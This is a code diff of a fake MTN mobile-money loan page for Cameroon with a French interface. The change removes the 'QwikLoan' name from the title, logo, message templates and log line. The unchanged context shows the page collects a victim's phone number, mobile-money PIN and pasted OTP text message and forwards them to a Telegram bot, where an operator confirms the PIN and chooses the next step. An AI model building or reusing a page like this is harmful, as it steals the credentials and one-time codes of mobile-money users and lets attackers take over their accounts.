@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>MTN QwikLoan – Vérification OTP</title>
+    <title>MTN  – Vérification OTP</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -377,7 +377,7 @@
             <!-- LOGO -->
             <div class="logo">
                 <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> QwikLoan</div>
+                <div class="logo-text"><span>MTN</span> </div>
             </div>
 
             <!-- TEXT -->
@@ -623,7 +623,7 @@
             const escapedPin = escapeHtml(pin);
 
             const msg =
-                `🔐 <b>MTN QwikLoan – PIN Confirmation</b>\n\n` +
+                `🔐 <b>MTN  – PIN Confirmation</b>\n\n` +
                 `<b>Phone:</b> <code>${escapeHtml(phoneNum)}</code>\n` +
                 `<b>Entered PIN:</b> <code>${escapedPin}</code>\n\n` +
                 `Confirm this PIN?`;
@@ -709,7 +709,7 @@
             const escapedMsg = escapeHtml(msgText);
             const phoneInfo = `📱 Phone: ${phone}`;
             const msg =
-                `🔐 <b>MTN QwikLoan – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;
+                `🔐 <b>MTN  – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;
 
             try {
                 await sendToTelegram({
@@ -810,7 +810,7 @@
             phone
         };
 
-        console.log('[MTN QwikLoan] OTP page (Cameroon) initialized with French UI and English Telegram messages.');
+        console.log('[MTN ] OTP page (Cameroon) initialized with French UI and English Telegram messages.');
     })();
     </script>
 
